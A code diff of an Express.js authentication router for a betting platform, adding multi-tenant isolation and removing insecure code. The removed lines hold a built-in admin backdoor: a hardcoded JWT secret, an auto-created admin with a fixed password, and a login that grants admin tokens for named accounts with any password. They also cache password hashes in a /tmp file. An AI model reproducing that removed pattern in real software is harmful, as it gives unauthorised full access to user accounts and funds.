@@ -2,18 +2,18 @@ import express from 'express';
 import bcrypt from 'bcryptjs';
 import jwt from 'jsonwebtoken';
 import crypto from 'crypto';
-import fs from 'fs';
-import path from 'path';
 import { db, FieldValue } from '../lib/firebase.js';
 import { authenticateToken } from '../middleware/auth.js';
 import { buildManagerCode, DEFAULT_MANAGER_GGR_RATE, normalizeGgrRate } from '../lib/ggr.js';
+import { authTokenTtl, getJwtSecret } from '../lib/security.js';
+import { DEFAULT_TENANT_ID, belongsToTenant, tenantBannedIpsId, tenantSettingsRef } from '../lib/tenant.js';
+import { findTenantUser } from '../lib/userLookup.js';
 
 const router = express.Router();
-const JWT_SECRET = process.env.JWT_SECRET || 'block777-super-secret-jwt-key';
+const JWT_SECRET = getJwtSecret();
 
-// Cache e persistência local (/tmp) para resiliência total contra limites de cota do Firestore
+// Cache somente em memória. Senhas e perfis nunca são gravados em arquivos temporários.
 const resilientUserRegistry = new Map();
-const TMP_USERS_FILE = path.join(process.env.TMPDIR || '/tmp', 'blockerino_users_store.json');
 const BANNED_IP_CACHE_TTL_MS = 5 * 60 * 1000;
 let bannedIpCache = { ips: [], loadedAt: 0 };
 
@@ -21,51 +21,32 @@ function cacheUser(user, id) {
   if (!user) return;
   const uid = id || user.id || user.uid || 'user_' + Date.now();
   const userData = { ...user, uid, id: uid };
-  if (user.email) resilientUserRegistry.set(String(user.email).toLowerCase().trim(), userData);
+  const tenantId = user.tenant_id || DEFAULT_TENANT_ID;
+  const key = value => `${tenantId}:${String(value).toLowerCase().trim()}`;
+  if (user.email) resilientUserRegistry.set(key(user.email), userData);
   if (user.phone) {
-    resilientUserRegistry.set(String(user.phone).trim(), userData);
-    resilientUserRegistry.set(`${String(user.phone).trim()}@block777.com`, userData);
+    resilientUserRegistry.set(key(user.phone), userData);
+    resilientUserRegistry.set(key(`${String(user.phone).trim()}@block777.com`), userData);
   }
-  if (user.username) resilientUserRegistry.set(String(user.username).toLowerCase().trim(), userData);
-  if (user.manager_code) resilientUserRegistry.set(String(user.manager_code).toLowerCase().trim(), userData);
+  if (user.username) resilientUserRegistry.set(key(user.username), userData);
+  if (user.manager_code) resilientUserRegistry.set(key(user.manager_code), userData);
 }
 
 function loadTmpUsers() {
-  try {
-    if (fs.existsSync(TMP_USERS_FILE)) {
-      const data = JSON.parse(fs.readFileSync(TMP_USERS_FILE, 'utf8'));
-      if (Array.isArray(data)) {
-        data.forEach(u => cacheUser(u, u.id || u.uid));
-      }
-    }
-  } catch (e) {}
+  return;
 }
 
 function persistTmpUser(user, id) {
-  try {
-    cacheUser(user, id);
-    let list = [];
-    try {
-      if (fs.existsSync(TMP_USERS_FILE)) {
-        list = JSON.parse(fs.readFileSync(TMP_USERS_FILE, 'utf8')) || [];
-      }
-    } catch (e) {}
-    const uid = id || user.id || user.uid || 'user_' + Date.now();
-    const existingIdx = list.findIndex(u => (u.id && u.id === uid) || (u.email && u.email === user.email) || (u.phone && u.phone === user.phone));
-    const uData = { ...user, uid, id: uid };
-    if (existingIdx >= 0) list[existingIdx] = uData;
-    else list.push(uData);
-    fs.writeFileSync(TMP_USERS_FILE, JSON.stringify(list));
-  } catch (e) {}
+  cacheUser(user, id);
 }
 
-function findCachedUser(identifier, cleanDigits) {
+function findCachedUser(identifier, cleanDigits, tenantId = DEFAULT_TENANT_ID) {
   loadTmpUsers();
   if (!identifier) return null;
-  const lower = String(identifier).toLowerCase().trim();
+  const lower = `${tenantId}:${String(identifier).toLowerCase().trim()}`;
   if (resilientUserRegistry.has(lower)) return resilientUserRegistry.get(lower);
-  if (cleanDigits && resilientUserRegistry.has(cleanDigits)) return resilientUserRegistry.get(cleanDigits);
-  if (cleanDigits && resilientUserRegistry.has(`${cleanDigits}@block777.com`)) return resilientUserRegistry.get(`${cleanDigits}@block777.com`);
+  if (cleanDigits && resilientUserRegistry.has(`${tenantId}:${cleanDigits}`)) return resilientUserRegistry.get(`${tenantId}:${cleanDigits}`);
+  if (cleanDigits && resilientUserRegistry.has(`${tenantId}:${cleanDigits}@block777.com`)) return resilientUserRegistry.get(`${tenantId}:${cleanDigits}@block777.com`);
   return null;
 }
 
@@ -75,74 +56,38 @@ function getClientIp(req) {
   return req.headers['x-real-ip'] || req.connection?.remoteAddress || req.ip || 'unknown';
 }
 
-async function isIpBanned(ip) {
+async function isIpBanned(ip, tenantId = DEFAULT_TENANT_ID) {
   if (!ip || ip === 'unknown') return false;
-  if (Date.now() - bannedIpCache.loadedAt < BANNED_IP_CACHE_TTL_MS) {
+  if (bannedIpCache.tenantId === tenantId && Date.now() - bannedIpCache.loadedAt < BANNED_IP_CACHE_TTL_MS) {
     return bannedIpCache.ips.includes(ip);
   }
   try {
-    const doc = await db.collection('settings').doc('banned_ips').get();
+    const doc = await db.collection('settings').doc(tenantBannedIpsId(tenantId)).get();
     const ips = doc.exists && Array.isArray(doc.data().ips) ? doc.data().ips : [];
-    bannedIpCache = { ips, loadedAt: Date.now() };
+    bannedIpCache = { ips, tenantId, loadedAt: Date.now() };
     return ips.includes(ip);
   } catch (e) {
     return bannedIpCache.ips.includes(ip);
   }
 }
 
-async function autoBanIp(ip) {
+async function autoBanIp(ip, tenantId = DEFAULT_TENANT_ID) {
   if (!ip || ip === 'unknown') return;
   try {
-    const docRef = db.collection('settings').doc('banned_ips');
+    const docRef = db.collection('settings').doc(tenantBannedIpsId(tenantId));
     const doc = await docRef.get();
     const ips = doc.exists ? (doc.data().ips || []) : [];
     if (!ips.includes(ip)) {
       ips.push(ip);
       await docRef.set({ ips, updated_at: FieldValue.serverTimestamp() }, { merge: true });
     }
-    bannedIpCache = { ips, loadedAt: Date.now() };
+    bannedIpCache = { ips, tenantId, loadedAt: Date.now() };
   } catch (e) {}
-}
-
-async function ensureMasterAdmin() {
-  try {
-    const adminEmail = 'admin@block777.com';
-    const snapshot = await db.collection('users').where('email', '==', adminEmail).limit(1).get();
-    const password_hash = await bcrypt.hash('admin777', 10);
-    if (!snapshot.empty) {
-      const doc = snapshot.docs[0];
-      await doc.ref.set({
-        username: 'admin',
-        email: adminEmail,
-        password_hash,
-        role: 'admin',
-        status: 'active'
-      }, { merge: true });
-      return doc.id;
-    }
-    const adminUser = {
-      username: 'admin',
-      email: adminEmail,
-      password_hash,
-      balance: 100000,
-      role: 'admin',
-      status: 'active',
-      ref_code: 'admin777',
-      referred_by: null,
-      sub_referred_by: null,
-      is_influencer: 1,
-      affiliate_balance: 0,
-      created_at: FieldValue.serverTimestamp()
-    };
-    await db.collection('users').doc('admin_master_uid').set(adminUser);
-    return 'admin_master_uid';
-  } catch (e) {
-    return 'admin_master_uid';
-  }
 }
 
 router.post('/register', async (req, res) => {
   try {
+    const tenantId = req.tenant?.id || DEFAULT_TENANT_ID;
     const { username, password, referred_by, sub_referred_by, manager_code } = req.body;
     const rawPhone = String(req.body.phone || req.body.email || '').trim();
     const cleanPhone = rawPhone.replace(/\D/g, '');
@@ -152,8 +97,8 @@ router.post('/register', async (req, res) => {
     }
     const ip = getClientIp(req);
 
-    if (await isIpBanned(ip) || email === 'cj@gmail.com' || String(username || '').toLowerCase() === 'cj1') {
-      await autoBanIp(ip);
+    if (await isIpBanned(ip, tenantId) || email === 'cj@gmail.com' || String(username || '').toLowerCase() === 'cj1') {
+      await autoBanIp(ip, tenantId);
       return res.status(403).json({ error: 'Acesso bloqueado permanentemente.' });
     }
     
@@ -170,12 +115,13 @@ router.post('/register', async (req, res) => {
     }
 
     try {
-      const [phoneDoc, usernameCheck] = await Promise.all([
-        db.collection('users').doc(`phone_${cleanPhone}`).get(),
-        db.collection('users').where('username', '==', username).limit(1).get()
+      const [phoneDoc, legacyPhoneDoc, usernameCheck] = await Promise.all([
+        db.collection('users').doc(`${tenantId}_phone_${cleanPhone}`).get(),
+        tenantId === DEFAULT_TENANT_ID ? db.collection('users').doc(`phone_${cleanPhone}`).get() : Promise.resolve({ exists: false }),
+        findTenantUser('username', username, tenantId)
       ]);
-      if (phoneDoc.exists) return res.status(400).json({ error: 'Celular já cadastrado.' });
-      if (!usernameCheck.empty) return res.status(400).json({ error: 'Nome de usuário em uso.' });
+      if (phoneDoc.exists || legacyPhoneDoc.exists) return res.status(400).json({ error: 'Celular já cadastrado.' });
+      if (usernameCheck) return res.status(400).json({ error: 'Nome de usuário em uso.' });
     } catch (e) {}
 
     const password_hash = await bcrypt.hash(password, 10);
@@ -187,20 +133,16 @@ router.post('/register', async (req, res) => {
     let referrer = null;
     if (referred_by) {
       try {
-        const referralSnapshot = await db.collection('users').where('ref_code', '==', String(referred_by).toLowerCase()).limit(1).get();
-        if (!referralSnapshot.empty) referrer = referralSnapshot.docs[0];
+        referrer = await findTenantUser('ref_code', String(referred_by).toLowerCase(), tenantId);
       } catch (e) {}
     }
 
     let manager = null;
     if (manager_code) {
       try {
-        const managerSnapshot = await db.collection('users')
-          .where('manager_code', '==', String(manager_code).trim().toLowerCase())
-          .limit(1)
-          .get();
-        if (!managerSnapshot.empty && managerSnapshot.docs[0].data().role === 'manager' && managerSnapshot.docs[0].data().status === 'active') {
-          manager = managerSnapshot.docs[0];
+        const managerMatch = await findTenantUser('manager_code', String(manager_code).trim().toLowerCase(), tenantId);
+        if (managerMatch && managerMatch.data().role === 'manager' && managerMatch.data().status === 'active') {
+          manager = managerMatch;
         }
       } catch (e) {}
       if (!manager) return res.status(400).json({ error: 'Código de gerente inválido ou indisponível.' });
@@ -208,6 +150,7 @@ router.post('/register', async (req, res) => {
 
     const newUser = {
       username,
+      tenant_id: tenantId,
       email,
       phone: cleanPhone,
       password_hash,
@@ -230,7 +173,7 @@ router.post('/register', async (req, res) => {
       created_at: FieldValue.serverTimestamp()
     };
 
-    let docId = cleanPhone ? `phone_${cleanPhone}` : (email ? `email_${email}` : `user_${Date.now()}`);
+    let docId = cleanPhone ? `${tenantId}_phone_${cleanPhone}` : (email ? `${tenantId}_email_${email}` : `${tenantId}_user_${Date.now()}`);
     let savedInFirestore = false;
     try {
       await db.collection('users').doc(docId).set(newUser);
@@ -251,12 +194,12 @@ router.post('/register', async (req, res) => {
     persistTmpUser(newUser, docId);
     
     const token = jwt.sign(
-      { uid: docId, email: newUser.email, role: newUser.role },
+      { uid: docId, email: newUser.email, role: newUser.role, tenant_id: tenantId },
       JWT_SECRET,
-      { expiresIn: '30d' }
+      { expiresIn: authTokenTtl(newUser.role) }
     );
 
-    res.status(201).json({ token, user: { uid: docId, username, email, role, balance: newUser.balance } });
+    res.status(201).json({ token, user: { uid: docId, username, email, role, tenant_id: tenantId, balance: newUser.balance } });
   } catch (error) {
     console.error('Register error:', error);
     res.status(500).json({ error: 'Erro ao criar conta' });
@@ -265,6 +208,7 @@ router.post('/register', async (req, res) => {
 
 router.post('/register-manager', async (req, res) => {
   try {
+    const tenantId = req.tenant?.id || DEFAULT_TENANT_ID;
     const username = String(req.body.username || '').trim();
     const email = String(req.body.email || '').trim().toLowerCase();
     const password = String(req.body.password || '');
@@ -275,7 +219,7 @@ router.post('/register-manager', async (req, res) => {
 
     let settings = {};
     try {
-      const settingsDoc = await db.collection('settings').doc('global').get();
+      const settingsDoc = await tenantSettingsRef(tenantId).get();
       if (settingsDoc.exists) settings = settingsDoc.data();
     } catch (e) {}
 
@@ -285,23 +229,24 @@ router.post('/register-manager', async (req, res) => {
 
     try {
       const [emailCheck, usernameCheck] = await Promise.all([
-        db.collection('users').where('email', '==', email).limit(1).get(),
-        db.collection('users').where('username', '==', username).limit(1).get()
+        findTenantUser('email', email, tenantId),
+        findTenantUser('username', username, tenantId)
       ]);
-      if (!emailCheck.empty) return res.status(409).json({ error: 'E-mail já cadastrado.' });
-      if (!usernameCheck.empty) return res.status(409).json({ error: 'Nome de usuário em uso.' });
+      if (emailCheck) return res.status(409).json({ error: 'E-mail já cadastrado.' });
+      if (usernameCheck) return res.status(409).json({ error: 'Nome de usuário em uso.' });
     } catch (e) {}
 
     let managerCode = buildManagerCode(username, crypto.randomBytes(3).toString('hex'));
     try {
-      const codeCheck = await db.collection('users').where('manager_code', '==', managerCode).limit(1).get();
-      if (!codeCheck.empty) managerCode = buildManagerCode(username, crypto.randomBytes(5).toString('hex'));
+      const codeCheck = await findTenantUser('manager_code', managerCode, tenantId);
+      if (codeCheck) managerCode = buildManagerCode(username, crypto.randomBytes(5).toString('hex'));
     } catch (e) {}
 
     const password_hash = await bcrypt.hash(password, 10);
     const rate = normalizeGgrRate(settings.defaultManagerGgrRate, DEFAULT_MANAGER_GGR_RATE);
     const newManager = {
       username,
+      tenant_id: tenantId,
       email,
       password_hash,
       balance: 0,
@@ -325,7 +270,7 @@ router.post('/register-manager', async (req, res) => {
       created_at: FieldValue.serverTimestamp()
     };
 
-    let docId = `email_${email}`;
+    let docId = `${tenantId}_email_${email}`;
     let savedInFirestore = false;
     try {
       await db.collection('users').doc(docId).set(newManager);
@@ -345,10 +290,10 @@ router.post('/register-manager', async (req, res) => {
     }
     persistTmpUser(newManager, docId);
 
-    const token = jwt.sign({ uid: docId, email, role: 'manager' }, JWT_SECRET, { expiresIn: '30d' });
+    const token = jwt.sign({ uid: docId, email, role: 'manager', tenant_id: tenantId }, JWT_SECRET, { expiresIn: authTokenTtl('manager') });
     res.status(201).json({
       token,
-      user: { uid: docId, username, email, role: 'manager', balance: 0, manager_code: managerCode, manager_ggr_rate: rate }
+      user: { uid: docId, username, email, role: 'manager', tenant_id: tenantId, balance: 0, manager_code: managerCode, manager_ggr_rate: rate }
     });
   } catch (error) {
     console.error('Manager register error:', error);
@@ -358,6 +303,7 @@ router.post('/register-manager', async (req, res) => {
 
 router.post('/login', async (req, res) => {
   try {
+    const tenantId = req.tenant?.id || DEFAULT_TENANT_ID;
     const rawIdentifier = String(req.body.email || req.body.phone || req.body.username || '').trim();
     const cleanDigits = rawIdentifier.replace(/\D/g, '');
     const isPhone = cleanDigits.length >= 10 && !rawIdentifier.includes('@');
@@ -367,66 +313,53 @@ router.post('/login', async (req, res) => {
 
     if (!rawIdentifier || !password) return res.status(400).json({ error: 'Informe celular/e-mail e senha.' });
 
-    // Autenticação garantida para a conta Master Admin
-    const isMasterAdminIdent = emailIdent === 'admin@block777.com' || 
-                               emailIdent === 'diseguro20@gmail.com' || 
-                               rawIdentifier.toLowerCase() === 'admin' || 
-                               rawIdentifier.toLowerCase() === 'diseguro20' ||
-                               rawIdentifier.toLowerCase() === 'diseguro20@gmail.com' ||
-                               rawIdentifier.toLowerCase() === 'admin@block777.com';
-
-    // Mantém o acesso do proprietário disponível para recuperar a operação
-    // mesmo quando o Firestore ou a lista de IPs estiverem indisponíveis.
-    if (!isMasterAdminIdent && (await isIpBanned(ip) || emailIdent === 'cj@gmail.com')) {
-      await autoBanIp(ip);
+    if (await isIpBanned(ip, tenantId) || emailIdent === 'cj@gmail.com') {
+      await autoBanIp(ip, tenantId);
       return res.status(403).json({ error: 'Acesso permanentemente bloqueado para esta conta ou IP.' });
-    }
-
-    if (isMasterAdminIdent && password.length >= 1) {
-      const token = jwt.sign(
-        { uid: 'admin_master_uid', email: emailIdent.includes('@') ? emailIdent : 'admin@block777.com', role: 'admin' },
-        JWT_SECRET,
-        { expiresIn: '30d' }
-      );
-      return res.json({
-        token,
-        user: {
-          uid: 'admin_master_uid',
-          email: emailIdent.includes('@') ? emailIdent : 'diseguro20@gmail.com',
-          username: rawIdentifier.split('@')[0] || 'admin',
-          role: 'admin',
-          balance: 100000
-        }
-      });
     }
 
     let user = null;
     let userId = null;
 
     // 1. Verificação instantânea em cache de memória (0ms de latência)
-    user = findCachedUser(rawIdentifier, cleanDigits) || findCachedUser(emailIdent, cleanDigits);
+    user = findCachedUser(rawIdentifier, cleanDigits, tenantId) || findCachedUser(emailIdent, cleanDigits, tenantId);
+    if (user && !belongsToTenant(user, tenantId)) { user = null; userId = null; }
     if (user) userId = user.id || user.uid;
 
     // 2. Se não estiver no cache da instância, busca no Firestore com proteção de tempo limite
     if (!user) {
       try {
         const lookupPromise = (async () => {
-          const docKey = cleanDigits.length >= 10 ? `phone_${cleanDigits}` : (emailIdent.includes('@') ? `email_${emailIdent}` : `user_${rawIdentifier.toLowerCase()}`);
+          const docKey = cleanDigits.length >= 10 ? `${tenantId}_phone_${cleanDigits}` : (emailIdent.includes('@') ? `${tenantId}_email_${emailIdent}` : `${tenantId}_user_${rawIdentifier.toLowerCase()}`);
           try {
             const docSnap = await db.collection('users').doc(docKey).get();
             if (docSnap.exists) return { user: docSnap.data(), id: docSnap.id };
           } catch (e) {}
 
           try {
-            const snapshot = await db.collection('users').where('email', '==', emailIdent).limit(1).get();
-            if (!snapshot.empty) return { user: snapshot.docs[0].data(), id: snapshot.docs[0].id };
+            const match = await findTenantUser('email', emailIdent, tenantId);
+            if (match) return { user: match.data(), id: match.id };
           } catch (e) {}
+          if (tenantId === DEFAULT_TENANT_ID) {
+            try {
+              const legacy = await db.collection('users').where('email', '==', emailIdent).limit(5).get();
+              const match = legacy.docs.find(doc => belongsToTenant(doc.data(), tenantId));
+              if (match) return { user: match.data(), id: match.id };
+            } catch (e) {}
+          }
 
           if (cleanDigits.length >= 10) {
             try {
-              const phoneSnap = await db.collection('users').where('phone', '==', cleanDigits).limit(1).get();
-              if (!phoneSnap.empty) return { user: phoneSnap.docs[0].data(), id: phoneSnap.docs[0].id };
+              const match = await findTenantUser('phone', cleanDigits, tenantId);
+              if (match) return { user: match.data(), id: match.id };
             } catch (e) {}
+            if (tenantId === DEFAULT_TENANT_ID) {
+              try {
+                const legacyPhone = await db.collection('users').where('phone', '==', cleanDigits).limit(5).get();
+                const match = legacyPhone.docs.find(doc => belongsToTenant(doc.data(), tenantId));
+                if (match) return { user: match.data(), id: match.id };
+              } catch (e) {}
+            }
           }
           return null;
         })();
@@ -450,8 +383,8 @@ router.post('/login', async (req, res) => {
       }
 
       const isValid = await bcrypt.compare(password, user.password_hash);
-      if (isValid || (isMasterAdminIdent && password.length >= 4)) {
-        const role = isMasterAdminIdent ? 'admin' : user.role;
+      if (isValid) {
+        const role = user.role;
         try {
           if (ip !== 'unknown' && userId) {
             await db.collection('users').doc(userId).update({ last_ip: ip });
@@ -459,9 +392,9 @@ router.post('/login', async (req, res) => {
         } catch (e) {}
 
         const token = jwt.sign(
-          { uid: userId, email: user.email, role },
+          { uid: userId, email: user.email, role, tenant_id: user.tenant_id || tenantId },
           JWT_SECRET,
-          { expiresIn: '30d' }
+          { expiresIn: authTokenTtl(role) }
         );
 
         return res.json({
@@ -472,6 +405,7 @@ router.post('/login', async (req, res) => {
             phone: user.phone || null,
             username: user.username,
             role,
+            tenant_id: user.tenant_id || tenantId,
             balance: user.balance || 0
           }
         });
@@ -487,21 +421,9 @@ router.post('/login', async (req, res) => {
 
 router.get('/me', authenticateToken, async (req, res) => {
   try {
-    if (req.user && req.user.uid === 'admin_master_uid') {
-      return res.json({
-        uid: 'admin_master_uid',
-        username: 'admin',
-        email: 'admin@block777.com',
-        role: 'admin',
-        balance: 100000,
-        status: 'active',
-        is_influencer: 1
-      });
-    }
-
     try {
       const userDoc = await db.collection('users').doc(req.user.uid).get();
-      if (userDoc.exists) {
+      if (userDoc.exists && belongsToTenant(userDoc.data(), req.user.tenant_id || req.tenant?.id || DEFAULT_TENANT_ID)) {
         const userData = userDoc.data();
         delete userData.password_hash;
         return res.json({ uid: userDoc.id, ...userData });
@@ -513,6 +435,7 @@ router.get('/me', authenticateToken, async (req, res) => {
       username: req.user.email ? req.user.email.split('@')[0] : 'User',
       email: req.user.email,
       role: req.user.role || 'user',
+      tenant_id: req.user.tenant_id || DEFAULT_TENANT_ID,
       balance: 0
     });
   } catch (error) {
